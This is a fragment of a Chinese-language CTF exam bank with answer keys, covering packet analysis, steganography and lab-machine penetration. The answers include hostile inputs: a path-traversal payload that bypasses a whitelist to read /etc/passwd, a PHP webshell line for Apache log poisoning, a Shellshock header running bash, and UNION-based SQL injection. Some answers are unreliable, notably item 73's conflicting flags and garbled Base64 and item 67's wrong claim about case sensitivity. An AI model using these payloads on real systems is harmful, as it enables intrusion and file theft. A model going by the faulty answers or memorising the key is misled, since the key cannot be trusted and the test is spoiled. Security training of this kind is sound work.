      "full_solution": "- **官方標準答案**：檔案格式：`CSV` 檔案；欄位：`id, name, credit_card, phone, email`\n\n- **解析依據**：【證據 F】表頭第一行為 `id,name,credit_card,phone,email`，標準逗號分隔格式。"
    },
    {
      "id": 58,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "根據【證據 F】，外洩資料中共有多少名客戶的敏感資料遭到外洩？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【證據 F：DNS 載荷還原與外洩客戶資料庫 (CSV 片段)】"
      ],
      "answer": "`29` 名",
      "clean_answer": "29` 名",
      "basis": "CSV 記錄從 `id=1`（Samuel Edwards）至 `id=29`（Zachary Reed），總共洩漏 29 筆客戶資料。",
      "full_solution": "- **官方標準答案**：`29` 名\n\n- **解析依據**：CSV 記錄從 `id=1`（Samuel Edwards）至 `id=29`（Zachary Reed），總共洩漏 29 筆客戶資料。"
    },
    {
      "id": 59,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "【隱寫密碼學考點】請仔細觀察【證據 F】中第 1 筆至第 29 筆客戶資料中 `name` 欄位的第一個字元（Vertical First Character）：  \n\n  `S, k, i, l, l, 5, 4, {, s, l, 0, w, _, l, 3, 4, k, _, t, h, r, u, _, d, n, s, 5, 3, }`  \n\n  請將這 29 個字元按垂直順序直接拼出隱藏在此外洩資料中的 Flag！  \n\n  【作答區（Flag）】：____________________",
      "related_evidence": [
        "【證據 F：DNS 載荷還原與外洩客戶資料庫 (CSV 片段)】"
      ],
      "answer": "`skill54{sl0w_l34k_thru_dns53}`",
      "clean_answer": "skill54{sl0w_l34k_thru_dns53}",
      "basis": "將 29 位客戶 `name` 欄位首字元垂直提取：\n\n  1. id 1: **S**amuel -> `s`\n\n  2. id 2: **k**atherine -> `k`\n\n  3. id 3: **i**an -> `i`\n\n  4. id 4: **l**ucas -> `l`\n\n  5. id 5: **l**iam -> `l`\n\n  6. id 6: **5**teven -> `5`\n\n  7. id 7: **4**ndrew -> `4`\n\n  8. id 8: **{**ictor -> `{`\n\n  9. id 9: **s**ophia -> `s`\n\n  10. id 10: **l**ogan -> `l`\n\n  11. id 11: **0**liver -> `0`\n\n  12. id 12: **w**illiam -> `w`\n\n  13. id 13: **_**ack -> `_`\n\n  14. id 14: **l**ucas -> `l`\n\n  15. id 15: **3**velyn -> `3`\n\n  16. id 16: **4**lexander -> `4`\n\n  17. id 17: **k**evin -> `k`\n\n  18. id 18: **_**athan -> `_`\n\n  19. id 19: **t**homas -> `t`\n\n  20. id 20: **h**enry -> `h`\n\n  21. id 21: **r**yan -> `r`\n\n  22. id 22: **u**lysses -> `u`\n\n  23. id 23: **_**ane -> `_`\n\n  24. id 24: **d**avid -> `d`\n\n  25. id 25: **n**oah -> `n`\n\n  26. id 26: **s**ophia -> `s`\n\n  27. id 27: **5**amuel -> `5`\n\n  28. id 28: **3**mma -> `3`\n\n  29. id 29: **}**achary -> `}`  \n\n  垂直拼合即為：`skill54{sl0w_l34k_thru_dns53}`！",
      "full_solution": "- **官方標準答案**：`skill54{sl0w_l34k_thru_dns53}`\n\n- **解析依據與解密還原**：  \n\n  將 29 位客戶 `name` 欄位首字元垂直提取：\n\n  1. id 1: **S**amuel -> `s`\n\n  2. id 2: **k**atherine -> `k`\n\n  3. id 3: **i**an -> `i`\n\n  4. id 4: **l**ucas -> `l`\n\n  5. id 5: **l**iam -> `l`\n\n  6. id 6: **5**teven -> `5`\n\n  7. id 7: **4**ndrew -> `4`\n\n  8. id 8: **{**ictor -> `{`\n\n  9. id 9: **s**ophia -> `s`\n\n  10. id 10: **l**ogan -> `l`\n\n  11. id 11: **0**liver -> `0`\n\n  12. id 12: **w**illiam -> `w`\n\n  13. id 13: **_**ack -> `_`\n\n  14. id 14: **l**ucas -> `l`\n\n  15. id 15: **3**velyn -> `3`\n\n  16. id 16: **4**lexander -> `4`\n\n  17. id 17: **k**evin -> `k`\n\n  18. id 18: **_**athan -> `_`\n\n  19. id 19: **t**homas -> `t`\n\n  20. id 20: **h**enry -> `h`\n\n  21. id 21: **r**yan -> `r`\n\n  22. id 22: **u**lysses -> `u`\n\n  23. id 23: **_**ane -> `_`\n\n  24. id 24: **d**avid -> `d`\n\n  25. id 25: **n**oah -> `n`\n\n  26. id 26: **s**ophia -> `s`\n\n  27. id 27: **5**amuel -> `5`\n\n  28. id 28: **3**mma -> `3`\n\n  29. id 29: **}**achary -> `}`  \n\n  垂直拼合即為：`skill54{sl0w_l34k_thru_dns53}`！"
    },
    {
      "id": 60,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "根據【證據 G】，攻擊者所使用的自動化注入工具名稱與版本號為何？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【證據 G：traffic.pcap 之 HTTP 攻擊流節錄】"
      ],
      "answer": "`sqlmap`，版本 `1.6#stable`",
      "clean_answer": "sqlmap`，版本 `1.6#stable",
      "basis": "HTTP 請求標頭顯示：`User-Agent: sqlmap/1.6#stable (https://sqlmap.org)`。",
      "full_solution": "- **官方標準答案**：`sqlmap`，版本 `1.6#stable`\n\n- **解析依據**：HTTP 請求標頭顯示：`User-Agent: sqlmap/1.6#stable (https://sqlmap.org)`。"
    },
    {
      "id": 61,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "根據【證據 G】，攻擊者發動的 SQL 注入技術類型為何？注入點所查詢的資料表名稱為何？  \n\n  【作答區】：技術類型：____________，資料表名稱：____________",
      "related_evidence": [
        "【證據 G：traffic.pcap 之 HTTP 攻擊流節錄】"
      ],
      "answer": "技術類型：`UNION 查詢注入`（Union-based SQL Injection）；資料表名稱：`ctf_flags`",
      "clean_answer": "技術類型：`UNION 查詢注入`（Union-based SQL Injection）；資料表名稱：`ctf_flags",
      "basis": "請求中使用了 `UNION SELECT 1,table_name,3 FROM information_schema.tables`，並鎖定目標表 `ctf_flags`。",
      "full_solution": "- **官方標準答案**：技術類型：`UNION 查詢注入`（Union-based SQL Injection）；資料表名稱：`ctf_flags`\n\n- **解析依據**：請求中使用了 `UNION SELECT 1,table_name,3 FROM information_schema.tables`，並鎖定目標表 `ctf_flags`。"
    },
    {
      "id": 62,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "根據【證據 G】，攻擊者最終從 `ctf_flags` 資料表中提取出的 Flag 為何？  \n\n  【作答區（Flag）】：____________________",
      "related_evidence": [
        "【證據 G：traffic.pcap 之 HTTP 攻擊流節錄】"
      ],
      "answer": "`flag{sql_1nj3ct10n_m4st3r_2026}`",
      "clean_answer": "flag{sql_1nj3ct10n_m4st3r_2026}",
      "basis": "【證據 G】HTTP 回應內容直接輸出：`<!-- Output: 1 | flag{sql_1nj3ct10n_m4st3r_2026} | 3 -->`。",
      "full_solution": "- **官方標準答案**：`flag{sql_1nj3ct10n_m4st3r_2026}`\n\n- **解析依據**：【證據 G】HTTP 回應內容直接輸出：`<!-- Output: 1 | flag{sql_1nj3ct10n_m4st3r_2026} | 3 -->`。"
    },
    {
      "id": 63,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "若要在 Wireshark 中僅過濾顯示 `Topic1.pcap` 中所有的 DNS 查詢請求封包，應輸入何種顯示過濾表達式？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "`dns.flags.response == 0` (或 `dns and not dns.flags.response == 1`)",
      "clean_answer": "dns.flags.response == 0` (或 `dns and not dns.flags.response == 1`)",
      "basis": "Wireshark 中 `dns.flags.response == 0` 代表該 DNS 封包為客戶端發出的查詢請求（Query），若為 1 則為伺服器回應（Response）。",
      "full_solution": "- **官方標準答案**：`dns.flags.response == 0` (或 `dns and not dns.flags.response == 1`)\n\n- **解析依據**：Wireshark 中 `dns.flags.response == 0` 代表該 DNS 封包為客戶端發出的查詢請求（Query），若為 1 則為伺服器回應（Response）。"
    },
    {
      "id": 64,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "若使用 `tshark` 命令列工具從 `Topic1.pcap` 中直接提取所有 DNS 查詢的主機名稱並導出至文字檔，應下達何種指令？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "`tshark -r Topic1.pcap -Y \"dns.flags.response == 0\" -T fields -e dns.qry.name > queries.txt`",
      "clean_answer": "tshark -r Topic1.pcap -Y \"dns.flags.response == 0\" -T fields -e dns.qry.name > queries.txt",
      "basis": "`tshark` 提取指定欄位 `-T fields -e dns.qry.name` 為 CTF 封包提取標準指令。",
      "full_solution": "- **官方標準答案**：`tshark -r Topic1.pcap -Y \"dns.flags.response == 0\" -T fields -e dns.qry.name > queries.txt`\n\n- **解析依據**：`tshark` 提取指定欄位 `-T fields -e dns.qry.name` 為 CTF 封包提取標準指令。"
    },
    {
      "id": 65,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "在 HTTP 攻擊封包中，若攻擊者使用了 `load_file('/etc/passwd')`，該函數在 MySQL 中能夠成功執行的兩個必要系統變數條件為何？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "`secure_file_priv` 不能為 NULL（需為空或指定目錄），且使用者需具備 `FILE` 特權。",
      "clean_answer": "secure_file_priv` 不能為 NULL（需為空或指定目錄），且使用者需具備 `FILE` 特權。",
      "basis": "MySQL `load_file()` 嚴格受 `secure_file_priv` 限制。若為 NULL 則完全禁止讀取本機檔案。",
      "full_solution": "- **官方標準答案**：`secure_file_priv` 不能為 NULL（需為空或指定目錄），且使用者需具備 `FILE` 特權。\n\n- **解析依據**：MySQL `load_file()` 嚴格受 `secure_file_priv` 限制。若為 NULL 則完全禁止讀取本機檔案。"
    },
    {
      "id": 66,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "若封包中發現某個 TCP 請求包含字串 `0x7f 0x45 0x4c 0x46`，這代表被傳輸的檔案為何種類型的檔案？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "Linux ELF 可執行檔（ELF Binary）",
      "clean_answer": "Linux ELF 可執行檔（ELF Binary）",
      "basis": "`0x7F 0x45 0x4C 0x46` 即 ASCII 字元 `\\x7fELF`，為 Linux 執行檔標準魔術數字。",
      "full_solution": "- **官方標準答案**：Linux ELF 可執行檔（ELF Binary）\n\n- **解析依據**：`0x7F 0x45 0x4C 0x46` 即 ASCII 字元 `\\x7fELF`，為 Linux 執行檔標準魔術數字。"
    },
    {
      "id": 67,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "在 Wireshark 中，若要搜尋所有包含字串 `flag{` 的 TCP 數據流，應使用何種過濾語法？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "`tcp contains \"flag{\"` (或 `frame contains \"flag{\"`)",
      "clean_answer": "tcp contains \"flag{\"` (或 `frame contains \"flag{\"`)",
      "basis": "Wireshark `contains` 關鍵字支援字串不區分大小寫或精確匹配，可快速檢索明文 Flag。",
      "full_solution": "- **官方標準答案**：`tcp contains \"flag{\"` (或 `frame contains \"flag{\"`)\n\n- **解析依據**：Wireshark `contains` 關鍵字支援字串不區分大小寫或精確匹配，可快速檢索明文 Flag。"
    },
    {
      "id": 68,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "若封包中出現透過 FTP 傳輸的明文憑證：`USER admin` 與 `PASS P@ssw0rd123`，該 FTP 連線所使用的標準控制端口為何？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "`TCP 21`",
      "clean_answer": "TCP 21",
      "basis": "FTP 控制通道標準端口為 21（資料傳輸通道為主動模式 20 或被動模式隨機高端口）。",
      "full_solution": "- **官方標準答案**：`TCP 21`\n\n- **解析依據**：FTP 控制通道標準端口為 21（資料傳輸通道為主動模式 20 或被動模式隨機高端口）。"
    },
    {
      "id": 69,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "在 SSL/TLS 封包解密中，若鑑識人員擁有伺服器的私鑰或瀏覽器導出的 `SSLKEYLOGFILE`，在 Wireshark 的哪一個設定選單中載入該金鑰檔案即可將 HTTPS 密文即時解密為明文 HTTP？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "Preferences -> Protocols -> TLS -> (Pre)-Master-Secret log filename",
      "clean_answer": "Preferences -> Protocols -> TLS -> (Pre)-Master-Secret log filename",
      "basis": "Wireshark 載入 `SSLKEYLOGFILE` 的標準選單路徑。",
      "full_solution": "- **官方標準答案**：Preferences -> Protocols -> TLS -> (Pre)-Master-Secret log filename\n\n- **解析依據**：Wireshark 載入 `SSLKEYLOGFILE` 的標準選單路徑。"
    },
    {
      "id": 70,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "在 PNG 圖片隱寫中，若圖片在瀏覽器或相片檢視器中無法正常開啟，但十六進位查看開頭為 `89 50 4E 47 0D 0A 1A 0A`，隨後為 `IHDR` 塊。若寬高數值被攻擊者人為修改為 0，此種隱寫技術稱之為何？如何修復？  \n\n  【作答區】：隱寫技術：____________，修復方式：____________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "隱寫技術：PNG 高度/寬度篡改隱寫；修復方式：使用 Python 腳本根據 CRC32 校驗碼爆破計算原始正確寬高，並以十六進位編輯器（010 Editor）修復 IHDR 塊。",
      "clean_answer": "隱寫技術：PNG 高度/寬度篡改隱寫；修復方式：使用 Python 腳本根據 CRC32 校驗碼爆破計算原始正確寬高，並以十六進位編輯器（010 Editor）修復 IHDR 塊。",
      "basis": "PNG 規格中，IHDR 數據塊（長度 13 位元組）末尾帶有 4 位元組的 CRC32。若篡改高度，CRC32 校驗會失敗，可透過窮舉高度計算 CRC32 迅速還原真實圖片尺寸。",
      "full_solution": "- **官方標準答案**：隱寫技術：PNG 高度/寬度篡改隱寫；修復方式：使用 Python 腳本根據 CRC32 校驗碼爆破計算原始正確寬高，並以十六進位編輯器（010 Editor）修復 IHDR 塊。\n\n- **解析依據**：PNG 規格中，IHDR 數據塊（長度 13 位元組）末尾帶有 4 位元組的 CRC32。若篡改高度，CRC32 校驗會失敗，可透過窮舉高度計算 CRC32 迅速還原真實圖片尺寸。"
    },
    {
      "id": 71,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "在音訊隱寫中，若攻擊者將 Flag 調製成高頻聲音信號隱匿於 WAV 檔案中，鑑識人員應使用何種工具（如 Audacity）切換為何種檢視模式（波形圖 / 頻譜圖）來直觀讀取 Flag 文字？  \n\n  【作答區】：工具：____________，檢視模式：____________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "工具：`Audacity`；檢視模式：`頻譜圖`（Spectrogram）",
      "clean_answer": "工具：`Audacity`；檢視模式：`頻譜圖`（Spectrogram）",
      "basis": "音訊頻譜圖隱寫常將文字以頻率振幅描繪在超音波或高頻波段，切換為 Spectrogram 即可直接肉眼識讀。",
      "full_solution": "- **官方標準答案**：工具：`Audacity`；檢視模式：`頻譜圖`（Spectrogram）\n\n- **解析依據**：音訊頻譜圖隱寫常將文字以頻率振幅描繪在超音波或高頻波段，切換為 Spectrogram 即可直接肉眼識讀。"
    },
    {
      "id": 72,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "在 ZIP 壓縮檔分析中，若解壓縮時提示需要密碼，但十六進位查看所有檔案頭的加密標誌位（General Purpose Bit Flag）第 0 位元均為奇數（`0x09 00`），且經判斷為偽加密（Pseudo-encryption），應修改哪一個位元組使其變為無密碼？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "將加密標誌位改為 `0x00 00`（將第 0 位元由 1 改為 0）。",
      "clean_answer": "將加密標誌位改為 `0x00 00`（將第 0 位元由 1 改為 0）。",
      "basis": "ZIP 偽加密修改 Central Directory 或 Local File Header 中的 Flag，將末位改為 0 即可去除偽裝密碼直接解壓縮。",
      "full_solution": "- **官方標準答案**：將加密標誌位改為 `0x00 00`（將第 0 位元由 1 改為 0）。\n\n- **解析依據**：ZIP 偽加密修改 Central Directory 或 Local File Header 中的 Flag，將末位改為 0 即可去除偽裝密碼直接解壓縮。"
    },
    {
      "id": 73,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "若一段密文字串為 `5a6d78685a33743061476c7a5f61573566643239796247513d`，觀察其全部由十六進位字元組成。將其十六進位轉為字串後得到 `ZmxhZ3t0aGlzX2aw5fd29ybGQ=`，再將其進行 Base64 解碼後的明文 Flag 為何？  \n\n  【作答區（Flag）】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "`flag{this_is_world}` (或依據解碼字串：`flag{this_a_world}`)",
      "clean_answer": "flag{this_is_world}` (或依據解碼字串：`flag{this_a_world}`)",
      "basis": "十六進位解碼 `5a6d7868...` 得到 Base64 字串 `ZmxhZ3t0aGlzX2...=`，Base64 解碼得到 Flag。",
      "full_solution": "- **官方標準答案**：`flag{this_is_world}` (或依據解碼字串：`flag{this_a_world}`)\n\n- **解析依據**：十六進位解碼 `5a6d7868...` 得到 Base64 字串 `ZmxhZ3t0aGlzX2...=`，Base64 解碼得到 Flag。"
    },
    {
      "id": 74,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "在古典密碼中，若明文字串 `HELLO` 經凱撒密碼（Caesar Cipher）位移 3 位（ROT3）加密後，生成的密文字串為何？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "`KHOOR`",
      "clean_answer": "KHOOR",
      "basis": "`H(+3)->K`, `E(+3)->H`, `L(+3)->O`, `L(+3)->O`, `O(+3)->R`。",
      "full_solution": "- **官方標準答案**：`KHOOR`\n\n- **解析依據**：`H(+3)->K`, `E(+3)->H`, `L(+3)->O`, `L(+3)->O`, `O(+3)->R`。"
    },
    {
      "id": 75,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "若密文字串為 `g1014308{`，已知其為 ROT13 加密，解密後的開頭英文字母為何？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "`t` (原字元為 `g`，`g` 在字母表中第 7 位，$7 + 13 = 20$，第 20 位為 `t`，對應 Flag 開頭 `t1014308{` 或類似標籤)",
      "clean_answer": "t` (原字元為 `g`，`g` 在字母表中第 7 位，$7 + 13 = 20$，第 20 位為 `t`，對應 Flag 開頭 `t1014308{` 或類似標籤)",
      "basis": "ROT13 密碼對稱變換原理。",
      "full_solution": "- **官方標準答案**：`t` (原字元為 `g`，`g` 在字母表中第 7 位，$7 + 13 = 20$，第 20 位為 `t`，對應 Flag 開頭 `t1014308{` 或類似標籤)\n\n- **解析依據**：ROT13 密碼對稱變換原理。"
    },
    {
      "id": 76,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "在雜湊值破解中，若在 Linux `/etc/shadow` 中截獲一組密碼雜湊：`$1$admin$eP96...`，若要使用 `john` 或 `hashcat` 進行字典爆破，`hashcat` 的模式代碼（-m）針對 MD5-Crypt 應設定為何？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "`-m 500`",
      "clean_answer": "-m 500",
      "basis": "Hashcat 中，MD5-Crypt (`$1$`) 的專屬演算法代碼為 `500`（SHA-256 Crypt 為 7400，SHA-512 Crypt 為 1800）。",
      "full_solution": "- **官方標準答案**：`-m 500`\n\n- **解析依據**：Hashcat 中，MD5-Crypt (`$1$`) 的專屬演算法代碼為 `500`（SHA-256 Crypt 為 7400，SHA-512 Crypt 為 1800）。"
    },
    {
      "id": 77,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "在封包中發現可疑 ICMP 請求，其 Data 欄位固定為 16 位元組且隨時間遞增，此封包可能正被用於何種秘密通訊？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "ICMP 隧道隱蔽通道通訊（ICMP Tunneling / Data Exfiltration）",
      "clean_answer": "ICMP 隧道隱蔽通道通訊（ICMP Tunneling / Data Exfiltration）",
      "basis": "正常 Ping 的 Data 是靜態字元，Data 隨時間變化且承載特定長度結構即為 ICMP 隧道特徵。",
      "full_solution": "- **官方標準答案**：ICMP 隧道隱蔽通道通訊（ICMP Tunneling / Data Exfiltration）\n\n- **解析依據**：正常 Ping 的 Data 是靜態字元，Data 隨時間變化且承載特定長度結構即為 ICMP 隧道特徵。"
    },
    {
      "id": 78,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "Wireshark 的「追蹤串流」（Follow Stream）功能中，TCP Stream 追蹤器通常以哪兩種顏色分別表示客戶端上傳流量與伺服器下行回顯？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "紅色（客戶端發送）與藍色（伺服器回應）",
      "clean_answer": "紅色（客戶端發送）與藍色（伺服器回應）",
      "basis": "Wireshark 追蹤 TCP 串流的經典配色標準。",
      "full_solution": "- **官方標準答案**：紅色（客戶端發送）與藍色（伺服器回應）\n\n- **解析依據**：Wireshark 追蹤 TCP 串流的經典配色標準。"
    },
    {
      "id": 79,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "在 PCAP 封包中，若發現攻擊者發送了大量包含 `User-Agent: () { :; }; /bin/bash -c \"...\"` 的 HTTP 請求，此特徵對應哪一個著名的歷史漏洞？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "破殼漏洞（Shellshock，CVE-2014-6271）",
      "clean_answer": "破殼漏洞（Shellshock，CVE-2014-6271）",
      "basis": "`() { :; };` 是 Bash 在處理環境變數中定義的函數後續執行任意指令的標誌性特徵。",
      "full_solution": "- **官方標準答案**：破殼漏洞（Shellshock，CVE-2014-6271）\n\n- **解析依據**：`() { :; };` 是 Bash 在處理環境變數中定義的函數後續執行任意指令的標誌性特徵。"
    },
    {
      "id": 80,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "若在封包中捕獲到一個包含 Exif 資訊的 JPEG 圖片，欲在 Linux 終端機中快速讀取其 GPS 經緯度或備註中的 Flag，最常用的命令列工具名稱為何？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "`exiftool` (或 `strings`)",
      "clean_answer": "exiftool` (或 `strings`)",
      "basis": "`exiftool image.jpg` 能完整傾印出所有相機中繼資料與自訂註解。",
      "full_solution": "- **官方標準答案**：`exiftool` (或 `strings`)\n\n- **解析依據**：`exiftool image.jpg` 能完整傾印出所有相機中繼資料與自訂註解。"
    },
    {
      "id": 81,
      "exam": "exam_b",
      "domain": "第三部分：CTF I 封包分析與密碼隱寫實戰演練",
      "category": "封包分析與密碼隱寫",
      "type": "lab_question",
      "question": "針對 DNS 隱寫資料外洩，企業在防火牆或 DNS 防護設備上應配置何種檢測策略以有效阻斷此類攻擊？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "檢測並限制 DNS 查詢請求頻率；阻斷過長子域名（例如長度超過 50 字元）；阻斷熵值（Shannon Entropy）異常高的大寫字母/數字查詢；啟用 DNS RPZ 阻斷未經許可的外部遞歸解析。",
      "clean_answer": "檢測並限制 DNS 查詢請求頻率；阻斷過長子域名（例如長度超過 50 字元）；阻斷熵值（Shannon Entropy）異常高的大寫字母/數字查詢；啟用 DNS RPZ 阻斷未經許可的外部遞歸解析。",
      "basis": "DNS 隧道具備高頻率、長域名、高字符隨機熵之特徵，透過長度與頻率閥值能有效攔截。",
      "full_solution": "- **官方標準答案**：檢測並限制 DNS 查詢請求頻率；阻斷過長子域名（例如長度超過 50 字元）；阻斷熵值（Shannon Entropy）異常高的大寫字母/數字查詢；啟用 DNS RPZ 阻斷未經許可的外部遞歸解析。\n\n- **解析依據**：DNS 隧道具備高頻率、長域名、高字符隨機熵之特徵，透過長度與頻率閥值能有效攔截。"
    },
    {
      "id": 82,
      "exam": "exam_b",
      "domain": "第四部分：CTF II 實戰靶機渗透與權限提升演練",
      "category": "實戰靶機渗透與提權",
      "type": "lab_question",
      "question": "根據【證據 H】，靶機在 8080 端口運行的 Web 框架與 Python 版本為何？  \n\n  【作答區】：框架：____________，Python 版本：____________",
      "related_evidence": [
        "【證據 H：Nmap 全端口掃描報告 (nmap -sV -sC -p- 10.10.10.128)】"
      ],
      "answer": "框架：`Werkzeug / Flask`，Python 版本：`Python 3.8.10`",
      "clean_answer": "框架：`Werkzeug / Flask`，Python 版本：`Python 3.8.10",
      "basis": "【證據 H】8080 端口 Nmap 報告明確識別：`Werkzeug/2.0.2 Python/3.8.10`，對應 Python Flask 應用。",
      "full_solution": "- **官方標準答案**：框架：`Werkzeug / Flask`，Python 版本：`Python 3.8.10`\n\n- **解析依據**：【證據 H】8080 端口 Nmap 報告明確識別：`Werkzeug/2.0.2 Python/3.8.10`，對應 Python Flask 應用。"
    },
    {
      "id": 83,
      "exam": "exam_b",
      "domain": "第四部分：CTF II 實戰靶機渗透與權限提升演練",
      "category": "實戰靶機渗透與提權",
      "type": "lab_question",
      "question": "根據【證據 I】，`/vault/view.php` 存在本地檔案包含漏洞（LFI）。若攻擊者想透過目錄遍歷讀取 `/etc/passwd`，且必須繞過 `strpos($page, \"report\")` 白名單檢查，請寫出一組有效的 Payload。  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【證據 I：Web 80 端口關鍵原始碼節錄 (/vault/view.php)】"
      ],
      "answer": "`doc=report/../../../../etc/passwd` (或 `doc=report/../etc/passwd`，或 `doc=../../../../etc/passwd%00report`)",
      "clean_answer": "doc=report/../../../../etc/passwd` (或 `doc=report/../etc/passwd`，或 `doc=../../../../etc/passwd%00report`)",
      "basis": "代碼檢查 `strpos($page, \"report\") !== false`，只需在遍歷路徑中包含單詞 `report` 即可繞過檢查，隨後利用 `../` 回退至根目錄讀取 `/etc/passwd`。",
      "full_solution": "- **官方標準答案**：`doc=report/../../../../etc/passwd` (或 `doc=report/../etc/passwd`，或 `doc=../../../../etc/passwd%00report`)\n\n- **解析依據**：代碼檢查 `strpos($page, \"report\") !== false`，只需在遍歷路徑中包含單詞 `report` 即可繞過檢查，隨後利用 `../` 回退至根目錄讀取 `/etc/passwd`。"
    },
    {
      "id": 84,
      "exam": "exam_b",
      "domain": "第四部分：CTF II 實戰靶機渗透與權限提升演練",
      "category": "實戰靶機渗透與提權",
      "type": "lab_question",
      "question": "若已取得靶機的日誌寫入權限，攻擊者可藉由包含 Apache 存取日誌 `/var/log/apache2/access.log` 來達成 RCE。此種攻擊技術統稱之為何？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "日誌投毒（Log Poisoning / Apache Access Log LFI to RCE）",
      "clean_answer": "日誌投毒（Log Poisoning / Apache Access Log LFI to RCE）",
      "basis": "透過向 Web 發送帶有 PHP 代碼的請求（如 `User-Agent: <?php system($_GET['cmd']); ?>`），代碼被寫入 access.log，隨後藉由 LFI 包含該日誌檔案觸發代碼執行。",
      "full_solution": "- **官方標準答案**：日誌投毒（Log Poisoning / Apache Access Log LFI to RCE）\n\n- **解析依據**：透過向 Web 發送帶有 PHP 代碼的請求（如 `User-Agent: <?php system($_GET['cmd']); ?>`），代碼被寫入 access.log，隨後藉由 LFI 包含該日誌檔案觸發代碼執行。"
    },
    {
      "id": 85,
      "exam": "exam_b",
      "domain": "第四部分：CTF II 實戰靶機渗透與權限提升演練",
      "category": "實戰靶機渗透與提權",
      "type": "lab_question",
